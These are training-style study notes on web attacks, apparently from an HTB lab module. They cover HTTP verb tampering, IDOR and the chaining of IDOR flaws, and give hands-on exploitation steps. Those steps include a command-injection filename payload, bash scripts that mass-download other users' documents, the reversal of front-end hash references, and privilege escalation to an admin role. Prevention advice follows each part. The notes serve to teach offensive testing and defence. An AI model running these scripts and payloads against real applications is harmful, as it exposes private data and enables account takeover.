# Web Attacks — Structured Notes

---

## Table of Contents

**1. Introduction to Web Attacks**
- [1.1 Web Attacks Covered in This Module](#web-attacks-covered-in-this-module)

---

**2. HTTP Verb Tampering**
- [2.1 Intro to HTTP Verb Tampering](#intro-to-http-verb-tampering)
  - [2.1.1 HTTP Verbs — Overview Table](#http-verbs--overview-table)
- [2.2 Insecure Configurations](#insecure-configurations)
- [2.3 Insecure Coding](#insecure-coding)
  - [2.3.1 How the Vulnerability Occurs](#how-the-vulnerability-occurs)
  - [2.3.2 Breaking Down the Problem](#breaking-down-the-problem)
  - [2.3.3 How an Attacker Exploits This](#how-an-attacker-exploits-this)
- [2.4 Bypassing Basic Authentication](#bypassing-basic-authentication)
  - [2.4.1 Identify](#identify)
  - [2.4.2 Exploit](#exploit)
  - [2.4.3 Step-by-Step: How to Bypass Basic Authentication](#step-by-step-how-to-bypass-basic-authentication)
- [2.5 Bypassing Security Filters](#bypassing-security-filters)
  - [2.5.1 Identify](#identify-1)
  - [2.5.2 Exploit](#exploit-1)
  - [2.5.3 Step-by-Step: How to Bypass a Security Filter](#step-by-step-how-to-bypass-a-security-filter)
- [2.6 Verb Tampering Prevention](#verb-tampering-prevention)
  - [2.6.1 Fixing Insecure Server Configurations](#fixing-insecure-server-configurations)
  - [2.6.2 Fixing Insecure Coding](#fixing-insecure-coding)

---

**3. Insecure Direct Object References (IDOR)**
- [3.1 Intro to IDOR](#intro-to-idor)
  - [3.1.1 Impact of IDOR Vulnerabilities](#impact-of-idor-vulnerabilities)
- [3.2 Identifying IDORs](#identifying-idors)
  - [3.2.1 URL Parameters & APIs](#url-parameters--apis)
  - [3.2.2 AJAX Calls in JavaScript](#ajax-calls-in-javascript)
  - [3.2.3 Understanding Hashed or Encoded References](#understanding-hashed-or-encoded-references)
  - [3.2.4 Comparing User Roles](#comparing-user-roles)
- [3.3 Mass IDOR Enumeration](#mass-idor-enumeration)
  - [3.3.1 Insecure Parameters](#insecure-parameters)
  - [3.3.2 Identifying the IDOR](#identifying-the-idor)
  - [3.3.3 Step-by-Step: Mass Enumeration with Bash](#step-by-step-mass-enumeration-with-bash)
- [3.4 Bypassing Encoded References](#bypassing-encoded-references)
  - [3.4.1 Identify](#identify-2)
  - [3.4.2 Function Disclosure](#function-disclosure)
  - [3.4.3 Verify the Hash](#verify-the-hash)
  - [3.4.4 Mass Enumeration](#mass-enumeration)
- [3.5 IDOR in Insecure APIs](#idor-in-insecure-apis)
  - [3.5.1 Identifying Insecure APIs](#identifying-insecure-apis)
  - [3.5.2 Exploiting Insecure APIs](#exploiting-insecure-apis)
- [3.6 Chaining IDOR Vulnerabilities](#chaining-idor-vulnerabilities)
  - [3.6.1 Information Disclosure](#information-disclosure)
  - [3.6.2 Modifying Other Users' Details](#modifying-other-users-details)
  - [3.6.3 Chaining Two IDOR Vulnerabilities](#chaining-two-idor-vulnerabilities)
- [3.7 IDOR Prevention](#idor-prevention)
  - [3.7.1 Object-Level Access Control (RBAC)](#object-level-access-control-rbac)
  - [3.7.2 Object Referencing](#object-referencing)

---

**4. XML External Entity (XXE) Injection**
- [4.1 Intro to XXE](#intro-to-xxe)
  - [4.1.1 XML Basics](#xml-basics)
  - [4.1.2 XML DTD (Document Type Definition)](#xml-dtd-document-type-definition)
  - [4.1.3 XML Entities](#xml-entities)
- [4.2 Local File Disclosure](#local-file-disclosure)
  - [4.2.1 Identifying](#identifying)
  - [4.2.2 Step-by-Step: Exploiting XXE to Read Local Files](#step-by-step-exploiting-xxe-to-read-local-files)
  - [4.2.3 Remote Code Execution via XXE](#remote-code-execution-via-xxe)
  - [4.2.4 Other XXE Attacks](#other-xxe-attacks)
- [4.3 Advanced File Disclosure](#advanced-file-disclosure)
  - [4.3.1 Advanced Exfiltration with CDATA](#advanced-exfiltration-with-cdata)
  - [4.3.2 Error-Based XXE](#error-based-xxe)
- [4.4 Blind Data Exfiltration](#blind-data-exfiltration)
  - [4.4.1 Out-of-Band Data Exfiltration](#out-of-band-data-exfiltration)
  - [4.4.2 Automated OOB Exfiltration with XXEinjector](#automated-oob-exfiltration-with-xxeinjector)
- [4.5 XXE Prevention](#xxe-prevention)
  - [4.5.1 Avoiding Outdated Components](#avoiding-outdated-components)
  - [4.5.2 Using Safe XML Configurations](#using-safe-xml-configurations)
  - [4.5.3 Additional Recommendations](#additional-recommendations)

---

## Introduction to Web Attacks

Web applications are used by almost every business today, making their security extremely important. As web apps grow more complex, attackers also develop more advanced techniques to exploit them. This creates a large attack surface, making web attacks the most common type of attack against companies. Protecting web applications has become a top priority for any IT or security team.

Attacking external-facing web applications can lead to compromise of a company's internal network, resulting in stolen data, disrupted services, or serious financial damage. Even companies without public-facing web apps usually have internal ones or API endpoints — both of which are just as vulnerable and can be exploited for the same goals.

### Web Attacks Covered in This Module

This module focuses on three major web attack types that are commonly found across web applications:

---

## Section 1: HTTP Verb Tampering

---

### Intro to HTTP Verb Tampering

The HTTP protocol works by accepting different HTTP methods (also called verbs) at the start of each request. Web applications are often configured to accept only specific methods like GET and POST, and they perform different actions depending on which method is used.

If a web application or server is not configured to restrict which HTTP methods it accepts, an attacker can send unusual or unexpected HTTP methods. This can lead to bypassing security controls, accessing restricted functions, or triggering server errors. The vulnerability arises from a mismatch between what the server accepts and what the application is coded to handle.

#### HTTP Verbs — Overview Table

| Verb    | Description |
|---------|-------------|
| GET     | Retrieves data from the server |
| POST    | Sends data to the server (e.g. form submissions) |
| HEAD    | Same as GET but only returns headers, not the response body |
| PUT     | Writes/uploads data to a specified location on the server |
| DELETE  | Deletes a resource at the specified location |
| OPTIONS | Lists the HTTP methods accepted by the server |
| PATCH   | Applies partial modifications to a resource |

Some of these verbs like PUT and DELETE can be very dangerous if the server allows them without proper restrictions, as they can be used to write or delete files directly on the server.

---

### Insecure Configurations

The first type of HTTP Verb Tampering vulnerability comes from **insecure web server configurations**. When a server's authentication rules only apply to certain HTTP methods (like GET and POST), other methods like HEAD or OPTIONS may still be accessible without any authentication at all.

For example, an Apache server might have a config like this:

```xml
<Limit GET POST>
    Require valid-user
</Limit>
```

This config only protects GET and POST requests. An attacker can still send a HEAD request and completely bypass the authentication check. This is a classic configuration mistake that leads to **authentication bypass**, allowing access to restricted web pages or admin panels without valid credentials.

---

### Insecure Coding

The second type of HTTP Verb Tampering vulnerability comes from **mistakes in the application's source code**. Developers sometimes write security filters that only check one HTTP method (e.g. GET), while the actual function uses a broader parameter that covers multiple methods. This inconsistency is what attackers exploit — the filter is bypassed simply by switching the HTTP method, even though the underlying vulnerable function still runs.

#### How the Vulnerability Occurs

Suppose a web page was found to be vulnerable to **SQL Injection**, and a developer tried to fix it by adding an input sanitization filter. The filter looks like this:

```php
$pattern = "/^[A-Za-z\s]+$/";

if(preg_match($pattern, $_GET["code"])) {
    $query = "Select * from ports where port_code like '%" . $_REQUEST["code"] . "%'";
    ...SNIP...
}
```

At first glance this looks like a fix — the `preg_match` function checks the input against a pattern that only allows letters and spaces. But there is a critical mistake hidden here.

#### Breaking Down the Problem

| Part of Code | What It Does | The Problem |
|---|---|---|
| `$_GET["code"]` | Reads the input from the GET parameter | Only GET is being checked by the filter |
| `preg_match($pattern, ...)` | Validates input — blocks special characters | Only runs on GET, not POST |
| `$_REQUEST["code"]` | Used in the actual SQL query | Accepts **both** GET and POST parameters |

The filter checks `$_GET["code"]` — meaning it only validates the GET version of the parameter. But the SQL query uses `$_REQUEST["code"]`, which in PHP covers **both GET and POST** parameters. This creates a dangerous inconsistency.

#### How an Attacker Exploits This

An attacker can switch the request method from GET to POST and send their malicious SQL payload in the POST body instead:

- The `$_GET["code"]` parameter will be **empty** — no special characters, so the filter passes.
- The `$_REQUEST["code"]` parameter will pick up the **POST value** — which contains the malicious payload.
- The SQL query executes with the injected input, making the application **vulnerable to SQL Injection** despite having a filter in place.

This is the core issue: the filter protects one method, but the function reads from all methods. Switching methods bypasses the protection entirely without touching the actual vulnerability.

---

### Bypassing Basic Authentication

Exploiting HTTP Verb Tampering is usually a straightforward process. The idea is to try different HTTP methods and observe how the server responds to each one. Automated tools can detect configuration-based Verb Tampering easily, but code-based Verb Tampering usually requires manual testing to identify and exploit properly.

This type of vulnerability is mainly caused by **Insecure Web Server Configurations**, and exploiting it can allow us to bypass the HTTP Basic Authentication prompt on certain pages entirely — without needing any valid credentials.

#### Identify

When we open the target web application, we see a basic **File Manager** that lets us add new files by typing their names and pressing Enter. Everything looks normal at first.

However, when we click the red **Reset** button to delete all files, the application immediately shows an **HTTP Basic Auth prompt** — meaning this function is restricted to authenticated users only. Since we have no credentials, submitting without them gives us a `401 Unauthorized` page.

To plan our attack, we need to figure out exactly what is restricted. We look at the URL the Reset button points to: `/admin/reset.php`. This could mean either the full `/admin/` directory is protected, or just that one file. We test by visiting `/admin/` directly — and we get the same login prompt. This confirms that the **entire `/admin/` directory is locked behind authentication**.

#### Exploit

Now that we know what is restricted, we move to exploitation. We need to identify the HTTP request method the application is using, then try alternative methods that the server may not have covered in its authentication rules.

#### Step-by-Step: How to Bypass Basic Authentication

**Step 1 — Identify the restricted page**

Try accessing a restricted page (e.g. `/admin/reset.php`) and see if you get a login prompt or a `401 Unauthorized` error. This tells you which pages require authentication.

**Step 2 — Check the request method**

Intercept the request using Burp Suite and check whether it uses GET or POST. This is the method currently being protected by authentication.

**Step 3 — Check what methods the server accepts**

Use `curl` to send an OPTIONS request and see which methods the server allows:

```bash
curl -i -X OPTIONS http://SERVER_IP:PORT/
```

Example response:
```
Allow: POST,OPTIONS,HEAD,GET
```

This tells you that the server also accepts HEAD requests.

**Step 4 — Send a HEAD request**

Change the request method to HEAD (using Burp's "Change Request Method") and forward it. Since authentication is only enforced on GET and POST, the HEAD request will pass through without prompting for a login.

**Step 5 — Confirm the bypass**

Even though a HEAD request returns no response body, the server-side function still executes. For example, a Reset function would still run and delete all files — confirming that authentication was bypassed successfully.

---

### Bypassing Security Filters

This is the second — and more common — type of HTTP Verb Tampering. It occurs when a web application's **security filter only checks one HTTP method**, leaving other methods unprotected.

This vulnerability is caused by **Insecure Coding** errors made during development, where the developer did not cover all HTTP methods in their security filter logic. This is very commonly found in filters that detect injection attacks — if the filter only checks POST parameters (e.g. `$_POST['parameter']`), an attacker can simply switch the request to GET and bypass the filter entirely.

#### Identify

In the **File Manager** web application, if we try to create a file with special characters in its name (e.g. `test;`), the application blocks the request and shows an error message indicating that a malicious request was detected. This tells us that a **back-end security filter** is in place that identifies injection attempts and blocks them.

No matter what special characters or patterns we try, the filter keeps blocking us. The application appears secure against injection. However, this filter may only be checking one HTTP method — which is our opening for a Verb Tampering attack.

#### Exploit

To try and exploit this vulnerability, we intercept the request in **Burp Suite** and use **"Change Request Method"** to switch it to a different method (e.g. from POST to GET).

This time, the `Malicious Request Denied!` message does not appear — our file is created successfully. This confirms the filter is not covering all HTTP methods.

To fully confirm the bypass and prove Command Injection is possible, we inject a command as the filename: `file1; touch file2;`. We change the request method again and send it. If **both `file1` and `file2` are created** on the server, we have successfully achieved Command Injection through the Verb Tampering bypass.

This proves that without the HTTP Verb Tampering vulnerability, the web application may have been secure against Command Injection — but the filter bypass opened the door to it completely.

#### Step-by-Step: How to Bypass a Security Filter

**Step 1 — Identify the filter**

Try submitting a request with special characters (e.g. `test;`). If the server blocks it with a message like `Malicious Request Denied!`, a security filter is in place.

**Step 2 — Change the request method**

Intercept the request in Burp Suite and use "Change Request Method" to switch from POST to GET (or vice versa). Send the modified request.

**Step 3 — Observe the result**

If the filter only checks POST parameters, a GET request with the same payload may pass through without triggering the filter. This confirms a Verb Tampering vulnerability.

**Step 4 — Exploit the underlying vulnerability**

Now try injecting a command using the bypassed method. For example, use the filename `file1; touch file2;` as a GET parameter. If both files are created on the server, you've confirmed **Command Injection** through Verb Tampering.

---

### Verb Tampering Prevention

Preventing HTTP Verb Tampering requires fixing both server configurations and application code. The key idea is to make sure security rules apply to **all HTTP methods**, not just a specific one or two.

#### Fixing Insecure Server Configurations

Vulnerable configurations restrict authentication only to specific methods. Here are examples across different web servers and how to fix them:

**Apache — vulnerable config:**
```xml
<Limit GET>
    Require valid-user
</Limit>
```
**Fix:** Use `LimitExcept` instead, which covers all methods *except* the listed ones:
```xml
<LimitExcept GET POST>
    Require valid-user
</LimitExcept>
```

**Tomcat (`web.xml`) — vulnerable:**
```xml
<http-method>GET</http-method>
```
**Fix:** Use `http-method-omission` to cover all other methods.

**ASP.NET (`web.config`) — vulnerable:**
```xml
<allow verbs="GET" roles="admin">
<deny verbs="GET" users="*">
```
**Fix:** Use `add/remove` directives that cover all verbs, not just GET.

As a general rule, **always disable or deny HEAD requests** unless your application specifically requires them, since they are the most commonly abused method in bypass attacks.

#### Fixing Insecure Coding

Insecure code uses inconsistent HTTP parameter variables across functions. The fix is to **use the same parameter type everywhere** — especially in security-critical functions:

| Language | Secure Function to Use |
|----------|------------------------|
| PHP      | `$_REQUEST['param']`   |
| Java     | `request.getParameter('param')` |
| C#       | `Request['param']`     |

By ensuring that both the security filter and the actual function use the same HTTP parameter scope, you eliminate the inconsistency that attackers exploit.

---

## Section 2: Insecure Direct Object References (IDOR)

---

### Intro to IDOR

IDOR (Insecure Direct Object References) is one of the most common web vulnerabilities. It happens when a web application exposes a direct reference to an internal object — like a file ID or database record — and the user can manipulate that reference to access other objects they shouldn't have access to.

The core cause of IDOR is a **weak or missing access control system on the back-end**. When the back-end doesn't verify whether a user is actually allowed to access a specific resource, an attacker can simply guess or change the ID to access someone else's data. These vulnerabilities are hard to detect automatically, which is why they often make it into production even in large applications like Facebook and Instagram.

#### Impact of IDOR Vulnerabilities

IDOR vulnerabilities can have serious consequences depending on what kind of objects are exposed:

- **IDOR Information Disclosure** — Accessing private files, personal records, or financial data of other users.
- **IDOR Insecure Function Calls** — Calling admin-only APIs or functions with a regular user account to perform unauthorized actions like changing passwords or granting roles.
- **Account Takeover** — By modifying another user's email via IDOR and then triggering a password reset, an attacker can fully take over an account.
- **Privilege Escalation** — Changing your own role from `employee` to `admin` if the back-end doesn't validate the role server-side.

---

### Identifying IDORs

Finding IDOR vulnerabilities requires carefully examining how the application references objects and whether the back-end enforces proper access checks on those references.

#### URL Parameters & APIs

The first place to look is URL parameters and API calls. When you receive a file or data, check the URL for patterns like `?uid=1` or `?filename=file_1.pdf`. These are direct object references. Try incrementing the value (`?uid=2`) to see if you can access another user's data. You can also use fuzzing tools to try thousands of values automatically.

#### AJAX Calls in JavaScript

Web applications built with JavaScript frameworks (React, Angular, Vue) sometimes include all function calls in the front-end code — even admin-only ones. If you inspect the JavaScript source, you may find AJAX calls that reference APIs with direct object IDs. These can be tested for IDOR even if they're never triggered during normal use.

For example, if we do not have an admin account, only user-level functions would be used in the app, while admin functions would be disabled or hidden. However, those admin functions may still exist in the front-end JavaScript code. If we find AJAX calls in the source that reference specific endpoints or APIs with direct object references, we can test them for IDOR — even if the app never calls them for our role.

```javascript
function changeUserPassword() {
    $.ajax({
        url:"change_password.php",
        type: "post",
        dataType: "json",
        data: {uid: user.uid, password: user.password, is_admin: is_admin},
        success:function(result){
            //
        }
    });
}
```

This function may never run for a normal user, but if you find it in the source, you can call it manually to test for IDOR. This is not limited to admin functions — any hidden or unused function calls that don't appear in normal HTTP traffic could expose IDOR vulnerabilities. We can do the same with back-end code if we have access to it (e.g. in open-source web applications).

#### Understanding Hashed or Encoded References

Some applications encode references using Base64 or hash them with MD5 instead of using plain sequential numbers. Even if the reference looks complex or random, it may still be exploitable if there is no proper access control on the back-end.

**Base64 Encoded References**

If you see a URL parameter like `?filename=ZmlsZV8xMjMucGRm`, the character set is a strong hint that it's Base64-encoded. Decode it to get the original value (e.g. `file_123.pdf`), change it to another value (e.g. `file_124.pdf`), re-encode it, and use the new encoded value in the request. If you get back data, the app is vulnerable to IDOR.

**Hashed References**

A reference like `download.php?filename=c81e728d9d4c2f636f067f89cc14862c` may look secure at first since it's not in plain text. However, if the hashing is done on the front-end (in JavaScript), the logic is fully visible to anyone who reads the source code. For example:

```javascript
$.ajax({
    url:"download.php",
    type: "post",
    dataType: "json",
    data: {filename: CryptoJS.MD5('file_1.pdf').toString()},
    success:function(result){
        //
    }
});
```

Here the app is MD5-hashing the filename directly. Since we can see exactly what's being hashed, we can calculate the hash for any other filename ourselves and use it to request files that don't belong to us. If the hash algorithm is not visible in the source, use a hash identifier tool to figure out the algorithm, then hash filenames manually to match and replicate the pattern.

#### Comparing User Roles

For more advanced IDOR attacks, register multiple user accounts and compare their HTTP requests and object references side by side. This helps you understand how the application calculates its URL parameters and unique identifiers, and lets you replicate those calculations for other users to access their data.

For example, suppose User 1 can view their salary by making an API call that returns:

```json
{
  "attributes": {
    "type": "salary",
    "url": "/services/data/salaries/users/1"
  },
  "Id": "1",
  "Name": "User1"
}
```

User 2 may not have access to the same API parameters and normally cannot replicate this call. However, with the details captured from User 1, you can log in as User 2 and send the exact same API request. If the back-end only checks that a valid session exists — but does not verify that the session belongs to the user whose data is being requested — the API will return User 1's salary data to User 2. This is a clear IDOR vulnerability caused by a missing back-end access control check.

---

### Mass IDOR Enumeration

Once you confirm an IDOR vulnerability, you can automate the process to extract data from many users at once instead of doing it manually one by one. Exploiting IDOR vulnerabilities can be easy in some cases but very challenging in others. For basic attacks, simple techniques are enough. For advanced attacks, you need to understand how the app calculates object references and how its access control system works before you can enumerate at scale.

#### Insecure Parameters

Let's walk through a real example using an **Employee Manager** web application. When logged in as `uid=1` and navigating to the Documents page, the URL becomes:

```
/documents.php?uid=1
```

The page shows documents belonging to the current user, with file names like:

```html
/documents/Invoice_1_09_2021.pdf
/documents/Report_1_10_2021.pdf
```

The file names follow a predictable pattern — **user UID + month/year**. This is the most basic type called **Static File IDOR**. You could try fuzzing file names directly, but that only works if you know the prefix (e.g. `Invoice` or `Report`) and would miss other file types. A better approach is to manipulate the `uid` parameter in the URL directly.

#### Identifying the IDOR

Change the URL parameter from `?uid=1` to `?uid=2`. The page may look identical at first glance — same layout, same section headings. However, always check the actual file links in the page source, not just the page appearance. The linked files will be different:

```html
/documents/Invoice_2_08_2020.pdf
/documents/Report_2_12_2020.pdf
```

These are another employee's files — confirming the IDOR vulnerability. The app is using the `uid` GET parameter as a direct reference to the database records, with no back-end access control checking whether you are allowed to view that user's data. Another common variant uses a filter parameter like `uid_filter=1` — which can also be changed to another user's ID, or removed entirely to show all users' documents at once.

#### Step-by-Step: Mass Enumeration with Bash

Manually changing the `uid` one by one is not practical in a real environment with hundreds or thousands of employees. Instead, we automate it with a bash script.

**Step 1 — View the HTML source of the documents page**

Press `CTRL+SHIFT+C` in Firefox to open the element inspector, then click any document link to view its HTML. You will see links structured like this:

```html
<li class='pure-tree_link'><a href='/documents/Invoice_3_06_2020.pdf' target='_blank'>Invoice</a></li>
<li class='pure-tree_link'><a href='/documents/Report_3_01_2020.pdf' target='_blank'>Report</a></li>
```

**Step 2 — Use curl and grep to extract file links**

Use `curl` to fetch the page and `grep` to pull out all PDF file paths using a Regex pattern that matches everything between `/documents` and `.pdf`:

```bash
curl -s "http://SERVER_IP:PORT/documents.php?uid=3" | grep -oP "\/documents.*?.pdf"
```

Output:
```
/documents/Invoice_3_06_2020.pdf
/documents/Report_3_01_2020.pdf
```

**Step 3 — Write a loop to enumerate all users and download every file**

Use a `for` loop to go through UIDs 1–10, extract all document links for each user, and download them with `wget`:

```bash
#!/bin/bash

url="http://SERVER_IP:PORT"

for i in {1..10}; do
        for link in $(curl -s "$url/documents.php?uid=$i" | grep -oP "\/documents.*?.pdf"); do
                wget -q $url/$link
        done
done
```

When you run this script, it downloads all documents for every employee from UID 1 to 10, successfully exploiting the IDOR vulnerability to mass enumerate and collect data across all accounts. You can also achieve the same result using tools like **Burp Intruder** or **ZAP Fuzzer** instead of a bash script.

---

### Bypassing Encoded References

In the previous section, the IDOR used employee UIDs in plain text — easy to enumerate. Some applications go further and **hash or encode** their object references to make enumeration harder. However, if the hashing logic runs on the front-end (in JavaScript), it is still fully visible to attackers and can be reversed and replicated.

#### Identify

Going back to the **Employee Manager** web application, we test the **Contracts** section. When we click on `Employment_contract.pdf` to download it, Burp Suite intercepts a POST request to `/download.php` with this data:

```
contract=cdd96d3cc73d1dbdaffa03cc6cd7339b
```

This looks like an **MD5 hash**. Since hashes are one-way functions, we cannot simply decode them. We need to figure out what value is being hashed. We can start by trying common values like `uid`, `username`, or `filename` and check if their MD5 hashes match:

```bash
echo -n 1 | md5sum
# c4ca4238a0b923820dcc509a6f75849b
```

This doesn't match. Trying other simple values also fails. At this point, the hash could be for a unique or combined value — which would make it a **Secure Direct Object Reference**. However, there is one fatal flaw: the hash is being calculated on the **front-end**.

#### Function Disclosure

Most modern web applications use JavaScript frameworks like Angular, React, or Vue.js. A common developer mistake is performing sensitive operations — like hash generation — in the front-end JavaScript, which exposes the full logic to anyone who reads the source.

Looking at the page source, we find the link is calling a JavaScript function:
```
javascript:downloadContract('1')
```

Inspecting the `downloadContract()` function in the source code reveals:

```javascript
function downloadContract(uid) {
    $.redirect("/download.php", {
        contract: CryptoJS.MD5(btoa(uid)).toString(),
    }, "POST", "_self");
}
```

Now we can see exactly what is happening:
- `btoa(uid)` → Base64-encodes the UID
- `CryptoJS.MD5(...)` → MD5-hashes the Base64 result
- The final hash is sent as the `contract` POST parameter

The function is called with `downloadContract('1')`, so for UID 1, the value being hashed is the Base64 encoding of `1`.

#### Verify the Hash

We can confirm this by replicating the same steps manually:

```bash
echo -n 1 | base64 -w 0 | md5sum
# cdd96d3cc73d1dbdaffa03cc6cd7339b
```

> **Tip:** Use `-n` with `echo` to avoid adding a newline, and `-w 0` with `base64` to prevent line wrapping. Both would change the MD5 output if included.

The hash matches exactly — we have successfully **reversed the front-end hashing technique** and turned what appeared to be a secure reference into an exploitable IDOR.

#### Mass Enumeration

Now that we know the formula (`Base64(uid)` → `MD5`), we can generate hashes for any user and use them to download their contracts.

**Step 1 — Generate hashes for all UIDs**

Use a loop to calculate the hash for employees 1 through 10 and strip the trailing ` -` from `md5sum` output using `tr -d`:

```bash
for i in {1..10}; do echo -n $i | base64 -w 0 | md5sum | tr -d ' -'; done
```

Output:
```
cdd96d3cc73d1dbdaffa03cc6cd7339b
0b7e7dee87b1c3b98e72131173dfbbbf
0b24df25fe628797b3a50ae0724d2730
f7947d50da7a043693a592b4db43b0a1
8b9af1f7f76daf0f02bd9c48c4a2e3d0
006d1236aee3f92b8322299796ba1989
b523ff8d1ced96cef9c86492e790c2fb
d477819d240e7d3dd9499ed8d23e7158
3e57e65a34ffcb2e93cb545d024f5bde
5d4aace023dc088767b4e08c79415dcd
```

**Step 2 — Send POST requests for each hash to download contracts**

Write a bash script that generates each hash and sends a POST request to `/download.php` with `curl`:

```bash
#!/bin/bash

for i in {1..10}; do
    for hash in $(echo -n $i | base64 -w 0 | md5sum | tr -d ' -'); do
        curl -sOJ -X POST -d "contract=$hash" http://SERVER_IP:PORT/download.php
    done
done
```

**Step 3 — Run the script and verify downloaded files**

```bash
bash ./exploit.sh
ls -1
```

Output:
```
contract_006d1236aee3f92b8322299796ba1989.pdf
contract_0b24df25fe628797b3a50ae0724d2730.pdf
contract_0b7e7dee87b1c3b98e72131173dfbbbf.pdf
contract_3e57e65a34ffcb2e93cb545d024f5bde.pdf
contract_5d4aace023dc088767b4e08c79415dcd.pdf
contract_8b9af1f7f76daf0f02bd9c48c4a2e3d0.pdf
contract_b523ff8d1ced96cef9c86492e790c2fb.pdf
contract_cdd96d3cc73d1dbdaffa03cc6cd7339b.pdf
contract_d477819d240e7d3dd9499ed8d23e7158.pdf
contract_f7947d50da7a043693a592b4db43b0a1.pdf
```

All 10 employee contracts are downloaded successfully. By reversing the front-end hashing technique, we turned a reference that looked secure into a fully exploitable IDOR — and used it to mass enumerate private files across all user accounts.

---

### IDOR in Insecure APIs

So far, IDOR has been used to access files and resources outside our user's access. But IDOR vulnerabilities can also exist in **API function calls**, allowing us to perform actions as other users — not just read their data.

There are two types to understand:
- **IDOR Information Disclosure** — reads other users' data (files, records, profiles)
- **IDOR Insecure Function Calls** — calls APIs or executes functions as another user (change passwords, modify profiles, buy items, delete accounts)

In many real attacks, these two types are chained together — first leak data through Information Disclosure, then use that data to exploit Insecure Function Calls.

#### Identifying Insecure APIs

In the **Employee Manager** app, we navigate to the **Edit Profile** page. The page lets us edit `Full Name`, `Email`, and `About Me`. When we click **Update Profile** and intercept the request in Burp, we see a **PUT request** to `/profile/api.php/profile/1` with this JSON body:

```json
{
    "uid": 1,
    "uuid": "40f5888b67c748df7efba008e7c2f9d2",
    "role": "employee",
    "full_name": "Amy Lindon",
    "email": "a_lindon@employees.htb",
    "about": "A Release is like a boat. 80% of the holes plugged is not good enough."
}
```

> **Note on HTTP methods in APIs:** PUT = update, POST = create, DELETE = delete, GET = retrieve.

The interesting fields here are `uid`, `uuid`, and `role`. The `role` field is set to `employee` and is also reflected in the `Cookie: role=employee` header — meaning **access control is being handled on the client side**, which is a critical security mistake. An attacker could manipulate any of these fields.

#### Exploiting Insecure APIs

We know we can freely change `full_name`, `email`, and `about` (visible form fields). Now let's test the hidden parameters to see what else we can control.

**Attempt 1 — Change `uid` to another user's ID**

Set `"uid": 2` in the JSON body. The server responds with `uid mismatch`. The app is comparing the JSON `uid` to the API endpoint (`/1`), so this check stops us from directly hijacking another account this way.

**Attempt 2 — Change the API endpoint to another user**

Change the endpoint to `/profile/api.php/profile/2` and set `"uid": 2`. The server responds with `uuid mismatch`. The app is checking that the `uuid` in the request matches the target user's actual UUID — and since we don't know User 2's UUID, we're blocked again.

**Attempt 3 — Try creating a new user (POST request)**

Change the request method to POST and send a new `uid`. The server responds: `Creating new employees is for admins only`. Sending a DELETE request gives a similar response: `Deleting employees is for admins only`. The app is using the `role=employee` cookie to check authorization.

**Attempt 4 — Try changing role to admin**

Change `"role": "employee"` to `"role": "admin"` or `"role": "administrator"`. The server responds: `Invalid role`. Without knowing a valid role name, we cannot escalate privileges this way.

At this point, all direct function call attempts have failed. However, we have only been testing **IDOR Insecure Function Calls**. We have not yet tested the API's **GET request for IDOR Information Disclosure**. If the GET endpoint has no access control, we may be able to read other users' full profile details — including their `uuid` — which would unlock the attacks that failed above.

---

### Chaining IDOR Vulnerabilities

The most powerful IDOR attacks chain two types together: first **leak data** using IDOR Information Disclosure, then **abuse functions** using IDOR Insecure Function Calls. This section shows how those two work together to achieve full application takeover.

After the Edit Profile page loads, we notice the app sends a **GET request** to the same API endpoint (`/profile/api.php/profile/1`) to fetch our profile details. The only authorization in this request is the `Cookie: role=employee` header — there is no JWT token or any other user-specific verification. This means the back-end may not be checking whether the session belongs to the requested profile.

#### Information Disclosure

We send a GET request but change the UID in the endpoint to another user's ID (e.g. `/profile/api.php/profile/2`). The server responds with that user's full profile:

```json
{
    "uid": "2",
    "uuid": "4a9bd19b3b8676199592a346051f950c",
    "role": "employee",
    "full_name": "Iona Franklyn",
    "email": "i_franklyn@employees.htb",
    "about": "It takes 20 years to build a reputation and few minutes of cyber-incident to ruin it."
}
```

This confirms an **IDOR Information Disclosure vulnerability**. We now have User 2's `uuid` — the exact value we were missing when our PUT request failed with `uuid mismatch`.

#### Modifying Other Users' Details

Now that we have User 2's `uuid`, we send a PUT request to `/profile/api.php/profile/2` using their `uid` and `uuid` alongside any changes we want to make. This time we get no access control errors, and a follow-up GET request confirms their details were successfully updated.

This opens up several follow-on attacks:
- **Account Takeover via Password Reset** — change the user's email to one we control, then trigger a password reset. The reset link goes to our email.
- **XSS via Profile Field** — inject an XSS payload into the `about` field. When the user visits their Edit Profile page, the script executes and we can attack them further.

#### Chaining Two IDOR Vulnerabilities

Now we enumerate all users using the same GET request technique, looping through UIDs to collect everyone's details. Eventually we find an admin account:

```json
{
    "uid": "X",
    "uuid": "a36fa9e66e85f2dd6f5e13cad45248ae",
    "role": "web_admin",
    "full_name": "administrator",
    "email": "webadmin@employees.htb",
    "about": "HTB{FLAG}"
}
```

We now know the valid admin role name: `web_admin`. Earlier, trying `"role": "admin"` gave us `Invalid role`. Now we can use the correct name.

**Step 1 — Set our own role to `web_admin`**

Intercept our own Update Profile PUT request and change `"role": "employee"` to `"role": "web_admin"`. This time we get no `Invalid role` error and no access control rejection. A follow-up GET confirms the change:

```json
{
    "uid": "1",
    "uuid": "40f5888b67c748df7efba008e7c2f9d2",
    "role": "web_admin",
    "full_name": "Amy Lindon",
    "email": "a_lindon@employees.htb",
    "about": "A Release is like a boat. 80% of the holes plugged is not good enough."
}
```

**Step 2 — Update the session cookie**

Refresh the page to update the cookie automatically, or manually set `Cookie: role=web_admin` in Burp to use the new role immediately.

**Step 3 — Create or delete users**

Now send a POST request to create a new user — no error this time. A GET request confirms the new user was created successfully. We can also delete users with a DELETE request, since the `Deleting employees is for admins only` check now passes with our admin role.

By combining an **IDOR Information Disclosure** vulnerability (leaking UUIDs and role names) with an **IDOR Insecure Function Call** (setting our own role and modifying others' data), we achieved full administrative control over the entire application — bypassing every access control check that initially blocked us.

---

### IDOR Prevention

IDOR vulnerabilities are mainly caused by **improper access control on the back-end**. To prevent them, two things must work together: a strong object-level access control system, and secure object referencing that avoids predictable or guessable IDs.

#### Object-Level Access Control (RBAC)

Access control should be at the core of any web application's design, as it affects every area of the system. The most reliable approach is a **Role-Based Access Control (RBAC)** system that maps user roles and permissions to every object and resource in the application.

Once RBAC is in place, every request a user makes is checked against their assigned role. The back-end either allows or denies the request based on whether the user has the right privileges for that specific object. Here is an example of secure access control logic:

```javascript
match /api/profile/{userId} {
    allow read, write: if user.isAuth == true
    && (user.uid == userId || user.roles == 'admin');
}
```

